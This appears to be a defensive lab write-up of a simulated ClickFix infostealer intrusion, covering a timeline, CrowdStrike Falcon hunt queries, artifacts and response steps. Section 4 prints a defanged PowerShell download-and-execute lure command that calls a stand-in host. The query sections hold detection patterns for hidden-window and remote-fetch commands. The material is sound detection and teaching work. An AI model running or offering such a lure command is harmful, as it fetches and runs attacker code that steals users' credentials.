> **Lab scenario.** This is a simulated ClickFix intrusion built in a home lab, with invented hosts, users and domains (defanged, documentation-range IPs). It shows my investigation method and the CrowdStrike Falcon queries I would use. It is not a real incident and contains no employer data. Event and field names vary by sensor version and policy, so validate every query in your own tenant before relying on it.

## 1. What ClickFix is

ClickFix is a social-engineering technique that makes the **user run the malware themselves**. A web page, often a compromised legitimate site or a fake "verify you are human" check, shows an error or CAPTCHA and gives instructions:

1. Press **Win + R** (or open a terminal)
2. Press **Ctrl + V**
3. Press **Enter**

The page has already placed a malicious command on the clipboard using JavaScript. The user never downloads a file, so there is no attachment to scan and no "Mark of the Web". The command runs from a trusted parent, `explorer.exe`, which is why it slips past controls tuned for Office macros and downloads.

Variants include fake browser-update and "fix this error" pages, instructions that use **File Explorer's address bar**, and prompts to open **Windows Terminal** instead of Run. Public reporting has tied the technique to commodity infostealers and remote access tools, not to one actor.

**MITRE ATT&CK:** T1204.004 (User Execution: Malicious Copy and Paste), T1189 (Drive-by Compromise), T1059.001 (PowerShell), T1218.005 (Mshta), T1105 (Ingress Tool Transfer).

## 2. Scenario summary

| Item | Detail (simulated) |
|---|---|
| Host | WS-031, user `asmith` |
| Lure | Fake "Verify you are human" page on a compromised website |
| Execution | Command pasted into the Run dialog, spawned from `explorer.exe` |
| Payload | Commodity infostealer, run in memory and from a user-writable folder |
| Impact | Browser-stored credentials and session cookies at risk, no lateral movement seen |
| Detection | EDR alert on PowerShell with a hidden window launched by `explorer.exe` |

## 3. Timeline (UTC, simulated)

| Time | Event | Source |
|---|---|---|
| 13:20:11 | User browses to a compromised site; fake verification page loads | Browser history, proxy log |
| 13:20:48 | User presses Win+R, pastes and runs a command | RunMRU, process creation |
| 13:20:49 | `explorer.exe` spawns `powershell.exe -w hidden ...` | `ProcessRollup2` |
| 13:20:51 | PowerShell resolves and connects to `cdn-verify[.]example` (`203.0.113.77`) | `DnsRequest`, `NetworkConnectIP4` |
| 13:20:55 | Second stage written to `%LOCALAPPDATA%\Temp\svc_update.exe` | `NewExecutableWritten` |
| 13:21:02 | `svc_update.exe` starts and reads browser profile folders | Process and file telemetry |
| 13:21:40 | HTTPS POST of a large archive to `198.51.100.23` | Network telemetry |
| 13:24:15 | Falcon detection raised, host network-contained by the analyst | Detections, containment audit |

## 4. What the lure command looks like

The pasted command usually carries a harmless-looking comment so that the user sees reassuring text in the Run box:

```
powershell -w hidden -c "iex (irm hxxps://cdn-verify[.]example/v) # I am not a robot - reCAPTCHA Verification ID: 2165"
```

Features worth hunting on:
- A **hidden window** flag (`-w hidden`, `-windowstyle hidden`) and **no profile / non-interactive** flags
- A download-and-execute pattern (`iex`, `irm`, `iwr`, `DownloadString`)
- A **trailing comment** with words such as "robot", "captcha", "verification" or "human"
- `mshta` or `curl` pointing at a remote URL, as an alternative to PowerShell

## 5. CrowdStrike Falcon Advanced Event Search queries

Advanced Event Search uses the LogScale query language. Queries below are templates. Field names such as `ParentBaseFileName`, `TargetProcessId`, `ContextProcessId` and `aid` come from standard Falcon telemetry, but check availability in your tenant. Start broad on a short time range, then tighten.

### 5.1 Core detection: Explorer launching a scripting host with download or hidden-window behavior
```
#event_simpleName=ProcessRollup2 event_platform=Win
| ParentBaseFileName=/^explorer\.exe$/i
| FileName=/^(powershell|pwsh|mshta|cmd|wscript|cscript|curl|bitsadmin|certutil)\.exe$/i
| CommandLine=/(-w(indowstyle)?\s+hidden|-enc|iex|invoke-expression|\birm\b|\biwr\b|downloadstring|https?:\/\/)/i
| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine], limit=200)
| sort(@timestamp, order=desc)
```
`explorer.exe` launching PowerShell with a URL is rare in most environments, so this is a high-signal starting point. Expect some admin and installer noise on first run; build an allowlist from what you confirm as benign.

### 5.2 Lure phrasing in the command line
```
#event_simpleName=ProcessRollup2 event_platform=Win
| CommandLine=/(captcha|not a robot|verification id|human verification|verify you are human|cloudflare)/i
| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine])
```
This catches the comment trick even if the attacker changes the downloader.

### 5.3 Other launch paths (Windows Terminal variant)
```
#event_simpleName=ProcessRollup2 event_platform=Win
| ParentBaseFileName=/^(WindowsTerminal|wt|explorer)\.exe$/i
| FileName=/^(powershell|pwsh|cmd)\.exe$/i
| CommandLine=/(\birm\b|\biwr\b|iex|downloadstring|mshta|https?:\/\/)/i
| groupBy([ComputerName, UserName, ParentBaseFileName, FileName], function=[count(as=hits), min(@timestamp, as=first_seen)])
| sort(hits, order=desc)
```

### 5.4 Pivot from a suspect process to everything it did
Step 1: note the `aid` and `TargetProcessId` of the suspicious PowerShell from query 5.1. Step 2: look at children and activity.

```
// Children of the suspect process
#event_simpleName=ProcessRollup2 aid=<AID> ParentProcessId=<TargetProcessId>
| table([@timestamp, FileName, CommandLine, SHA256HashData])
```
```
// DNS lookups made by the suspect process
#event_simpleName=DnsRequest aid=<AID> ContextProcessId=<TargetProcessId>
| table([@timestamp, DomainName])
```
```
// Network connections made by the suspect process
#event_simpleName=NetworkConnectIP4 aid=<AID> ContextProcessId=<TargetProcessId>
| table([@timestamp, RemoteAddressIP4, RemotePort])
```

**Advanced:** one query that joins a parent and its children by creating a shared key, so you don't copy IDs by hand:
```
#event_simpleName=ProcessRollup2 event_platform=Win
| case {
    ParentBaseFileName=/^explorer\.exe$/i FileName=/^powershell\.exe$/i | key := TargetProcessId ;
    * | key := ParentProcessId
  }
| selfJoinFilter([aid, key], where=[
    { ParentBaseFileName=/^explorer\.exe$/i FileName=/^powershell\.exe$/i CommandLine=/https?:\/\//i },
    { ParentBaseFileName=/^powershell\.exe$/i }
  ])
| table([@timestamp, ComputerName, ParentBaseFileName, FileName, CommandLine])
```
Treat this as a pattern to test, not a guaranteed drop-in.

### 5.5 Executables written to user-writable folders by scripting hosts
```
#event_simpleName=NewExecutableWritten event_platform=Win
| ContextBaseFileName=/^(powershell|pwsh|mshta|cmd|curl)\.exe$/i
| TargetFileName=/\\(AppData|Temp|ProgramData|Users\\Public)\\/i
| table([@timestamp, ComputerName, UserName, ContextBaseFileName, TargetFileName, SHA256HashData])
```

### 5.6 Stack rare domains contacted by scripting hosts (fleet-wide)
```
#event_simpleName=DnsRequest event_platform=Win
| ContextBaseFileName=/^(powershell|pwsh|mshta|wscript|cscript)\.exe$/i
| groupBy([DomainName], function=[count(aid, distinct=true, as=hosts), count(as=lookups)])
| sort(hosts, order=asc, limit=100)
```
Domains seen from one or two hosts are the interesting ones. Review and enrich them with the [IOC checker](intel.html).

### 5.7 Run dialog evidence in the registry (if registry telemetry is enabled)
```
#event_simpleName=RegGenericValueUpdate event_platform=Win
| RegObjectName=/\\Explorer\\RunMRU/i
| table([@timestamp, ComputerName, UserName, RegObjectName, RegValueName, RegStringValue])
```
Registry visibility depends on your prevention policy. If it isn't collected, take the artifact directly from the host (section 6).

### 5.8 Persistence follow-up
```
#event_simpleName=ScheduledTaskRegistered event_platform=Win
| TaskExecCommand=/(powershell|mshta|AppData|Temp)/i
| table([@timestamp, ComputerName, UserName, TaskName, TaskExecCommand])
```

### 5.9 Scope: who else ran the same command?
```
#event_simpleName=ProcessRollup2 event_platform=Win
| CommandLine=/cdn-verify\.example/i
| groupBy([ComputerName, UserName], function=[count(as=runs), min(@timestamp, as=first_seen)])
```
Swap in the indicator domain, a distinctive path, or the verification ID string.

## 6. Host artifacts to collect

| Artifact | Why it matters |
|---|---|
| **RunMRU** `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` | Records what was typed or pasted into the Run dialog. The strongest ClickFix artifact for the Win+R variant. |
| **Browser history and cache** | Identifies the lure page and the referring site |
| **PowerShell logs** (Event 4104 script block, 4103 module) | Shows the decoded downloader, if logging is enabled |
| **Sysmon 1 / 3 / 11 / 22** or Security 4688 | Process, network, file and DNS evidence |
| **Prefetch, Amcache** | Proves the second-stage binary ran |
| **Dropped file** and its hash | Submission to a sandbox or intel lookup |
| **Falcon Real Time Response** | Remote collection of the user's registry hive and files on a contained host |

Note that clipboard contents are not logged by default, so the RunMRU entry and the process command line are the practical record.

## 7. Findings

- **Initial access:** user-assisted execution via a fake verification page (T1204.004).
- **Execution:** hidden PowerShell launched by `explorer.exe` fetched and ran a remote script.
- **Payload:** an infostealer staged in a user-writable folder that touched browser profile data.
- **Exfiltration:** one large HTTPS POST shortly after execution.
- **Not observed:** persistence, lateral movement, privilege escalation. Containment came about three minutes after the exfiltration event.

## 8. Response

**Contain**
1. Network-contain the host in Falcon, preserving the ability to run Real Time Response.
2. Collect RunMRU, browser history, PowerShell logs and the dropped binary before cleanup.

**Treat credentials as exposed**
3. Reset the user's password and **revoke sessions and tokens** for email, SSO and SaaS apps. Stolen session cookies can bypass MFA, so a password reset alone is not enough.
4. Review sign-in logs for the account for the days after execution.
5. Advise the user to treat saved browser passwords as compromised.

**Eradicate and scope**
6. Reimage the host, which is the safer choice after an infostealer.
7. Block the domain and IP at the proxy and DNS; search for other hosts (query 5.9).

## 9. Detection and prevention

- **Alert** on `explorer.exe` or a terminal launching PowerShell, `mshta`, or `curl` with a URL or a hidden window.
- **Restrict the Run dialog** where the business doesn't need it, using the Group Policy that removes the Run command. Test first, since some support workflows use it.
- **PowerShell hardening:** Script Block Logging, Constrained Language Mode where feasible, and application control for script hosts.
- **Attack Surface Reduction** rules and blocking `mshta` for standard users.
- **Training that names the technique:** "No legitimate website will ever ask you to press Win+R and paste a command." Short, specific awareness works better than general phishing training.
- **Browser and DNS filtering** to reduce exposure to compromised-site lures.

## 10. Key takeaways

1. ClickFix removes the file from the attack, so detect the **behavior**: the parent-child chain and the command line.
2. `explorer.exe` → PowerShell with a URL is a compact, high-signal hunt.
3. RunMRU and the process command line are your evidence, because the clipboard is not recorded.
4. After an infostealer, **revoke sessions as well as passwords**.
5. Always validate hunt queries in your own tenant and tune them against your normal admin activity.
